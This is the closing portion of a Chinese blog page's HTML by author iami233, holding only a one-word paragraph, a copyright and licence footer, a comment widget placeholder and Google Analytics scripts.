+<p>同上</p>   </section> <footer class="mt-12 pt-8 border-t border-gray-200" role="contentinfo" aria-label="版权信息"> <div class="bg-gray-50 p-6 rounded-lg text-sm text-gray-700 leading-relaxed relative overflow-hidden">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="#4a4a4a" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10"> <div class="mb-2"> <strong class="text-gray-900">本文作者：</strong> <span>iami233</span> </div> <div class="mb-2"> <strong class="text-gray-900">本文链接：</strong> <a href="https://5ime.cn/pikachu.html" title="https://5ime.cn/pikachu.html" target="_blank" rel="noopener" class="text-blue-600 hover:text-blue-800 break-all" aria-label="文章永久链接"> https://5ime.cn/pikachu.html </a> </div> <div> <strong class="text-gray-900">版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank" rel="external nofollow noopener noreferrer" class="text-blue-600 hover:text-blue-800" aria-label="查看 CC BY-NC-SA 3.0 CN 协议详情">
+CC BY-NC-SA 3.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" data-astro-cid-cjuph4ok></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.BRmPG2zJ.js"></script>   </div> <script type="module" src="/_astro/Fancybox.astro_astro_type_script_index_0_lang.DeGMrsLV.js"></script> </article> </main> <footer class="py-8 px-4 pb-12 text-center" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2025 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-8Z68BHM5GN');
+</script> <script type="module" src="/_astro/BlogPost.astro_astro_type_script_index_1_lang.znP5JH7M.js"></script></body></html>
